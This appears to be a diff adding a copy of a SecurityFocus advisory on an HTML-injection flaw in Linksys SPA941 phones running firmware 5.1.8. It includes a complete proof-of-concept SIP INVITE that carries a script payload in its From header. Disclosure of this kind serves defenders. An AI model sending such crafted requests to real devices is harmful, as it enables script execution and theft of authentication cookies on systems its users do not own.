@@ -1,0 +1,29 @@
+source: http://www.securityfocus.com/bid/25987/info
+
+Linksys SPA941 devices are prone to an HTML-injection vulnerability because the built-in webserver fails to properly sanitize user-supplied input before using it in dynamically generated content.
+
+Attacker-supplied HTML and script code would execute in the context of the affected website, potentially allowing an attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user; other attacks are also possible.
+
+Linksys SPA941 devices with firmware version 5.1.8 are vulnerable; other versions may also be affected.
+
+INVITE sip:h@192.168.1.3 SIP/2.0
+Via: SIP/2.0/UDP 192.168.1.9:5060;rport
+To: sip:h@192.168.1.3
+From: "<script>alert('hack')</script>""natraj" <sip:natraj@loria.fr>;tag=002f000c
+Call-ID: 401010907@192.168.1.9
+CSeq: 4857 INVITE
+Content-Type: application/sdp
+Subject: sip: natraj@loria.fr
+Contact: "natraj" <sip:192.168.1.9:5060;transport=udp>
+Content-Length: 214
+
+v=0
+o=root 47650 47650 IN IP4 192.168.1.9
+s=session
+c=IN IP4 192.168.1.9
+t=0 0
+m=audio 5070 RTP/AVP 3 0 110 5
+a=rtpmap:3 GSM/8000/1
+a=rtpmap:0 PCMU/8000/1
+a=rtpmap:110 speex/8000/1
+a=rtpmap:5 DVI4/8000/1
